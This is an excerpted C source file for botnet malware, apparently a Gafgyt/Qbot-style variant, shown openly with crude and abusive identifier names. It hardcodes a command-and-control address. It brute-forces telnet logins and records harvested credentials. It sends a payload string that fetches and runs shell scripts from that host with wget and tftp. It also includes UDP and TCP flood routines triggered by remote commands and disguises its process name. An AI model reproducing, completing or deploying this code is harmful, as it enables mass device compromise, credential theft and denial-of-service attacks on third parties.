...
#define pornhub_rocks (sizeof(danielbaldwin) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
...
unsigned char *danielbaldwin[] = { "89.34.97.194:23" };
...
char *pussyload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.97.194/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 89.34.97.194 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 89.34.97.194; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
...
const char *big_dicks[] = { "/bin/busybox", "/bin/ps", "/bin/cat", "/bin/echo", "/bin/sh", "/bin/bash", (char *)0};
...
const char* fatd1cks(struct telstate_t* telstate) { // get host
        struct in_addr in_addr_ip; 
        in_addr_ip.s_addr = telstate->ip;
        return inet_ntoa(in_addr_ip);
}
void adv_c0ckz(struct telstate_t* telstate, int new_state) { // advance
        if(new_state == 0) {
                close(telstate->fd);
        }
...
void res_c0ckz(struct telstate_t* telstate) { // reset
...
void fuckfatpeople(int wait_usec, int maxfds) {
        ...
        while(1) {
					...
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances2)) {
						...
						if(contains_fail(fds[i].sockbuf)) {
							...
							if(fds[i].complete == 2) {
								...
								bignetreppin(lots_of_random_shit, "INFECTION ATTEMPT - %s:%s:%s", fatd1cks(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
								adv_c0ckz(&fds[i], 7);
							}
						}
						else {
			...
			case 8:
				{	
					int i = 0, small_dicks = 0;
					char bitch_with_a_dick[512];
					memset(bitch_with_a_dick, 0, sizeof(bitch_with_a_dick));
					for (small_dicks = 0; big_dicks[++small_dicks] != 0;);
					for (i = 0; i < small_dicks; i++) {
						if (access(big_dicks[i], X_OK) != -1) {
							sprintf(bitch_with_a_dick, "cp || /bin/busybox cp %s ./", big_dicks[i]);
							system(bitch_with_a_dick);
							adv_c0ckz(&fds[i], 9);
						}
						else {
							bignetreppin(lots_of_random_shit, "S1 INFECTION FAIL - %s:%s:%s", fatd1cks(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
							res_c0ckz(&fds[i]);
						}
					}
				}
            case 9:
				{
                    fds[i].totalTimeout = 0;
                        ...
                        if(send(fds[i].fd, pussyload, strlen(pussyload), MSG_NOSIGNAL) < 0) {
                            bignetreppin(lots_of_random_shit, "INFECTION SUCCESS - %s:%s:%s", fatd1cks(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                            res_c0ckz(&fds[i]);
                            continue;
                        }
                        if(fds[i].totalTimeout + 40 < time(NULL))  {
                            bignetreppin(lots_of_random_shit, "S2 INFECTION FAIL - %s:%s:%s", fatd1cks(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                            res_c0ckz(&fds[i]);
                        }  
...
void l0ld0ngs(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
    ...
    while(1){
        if (a >= 50) 
        {
	    char *strng = makestring();
            send(iSTD_Sock, strng, STD2_SIZE, 0);
...
void d0ggyd1ckz(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval) {
        register unsigned int pollRegister;
        pollRegister = pollinterval;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
...
void fuckinghugec0ck(int argc, unsigned char *argv[]) {
        if(!strcmp(argv[0], "AMIHERE")) { // PING
                return;
        }
       if(!strcmp(argv[0], "FATFUCK")) {
        uint32_t parent;
		parent = fork();        
        int ii = 0;
        ...
        if(!strcmp(argv[0], "UDP")) {
                ...
                if(strstr(ip, ",") != NULL) {
                        ...
                        while(hi != NULL) {
                                if(!listFork()) {
                                        l0ld0ngs(hi, port, time, spoofed, packetsize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                        ...
                        if (listFork()) { return; }
                        l0ld0ngs(ip, port, time, spoofed, packetsize, pollinterval);
                        _exit(0);
                }
        }
        if(!strcmp(argv[0], "TCP")) {
                ...
                if(strstr(ip, ",") != NULL) {
                        ...
                        while(hi != NULL) {
                                if(!listFork()) {
                                        d0ggyd1ckz(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                        ...
                        if (listFork()) { return; }
                        d0ggyd1ckz(ip, port, time, spoofed, flags, psize, pollinterval);
                        _exit(0);
						}
        }
		if(!strcmp(argv[0], "RAPE")) {
			if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
...
int fake_connection_wink_wink() {
	...
	strcpy(server, danielbaldwin[big_fat_d1ckz]);
	int port = 6667;
...
int main(int argc, unsigned char *argv[]) {
        ...
        argv[0] = "";
        prctl(PR_SET_NAME, (unsigned long) blow_me_bitch, 0, 0, 0);
        ...
        while(1) {
				...
				bignetreppin(lots_of_random_shit, "BOT CONNECTED | UID: %s | EUID: %s", getuid(), geteuid());
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(lots_of_random_shit, commBuf, 4096)) != -1) {
                        ...
                        commBuf[got] = 0x00;
                        trim(commBuf);
                        if(strstr(commBuf, "AMIHERE") == commBuf) { // PING
                                continue;
                        }
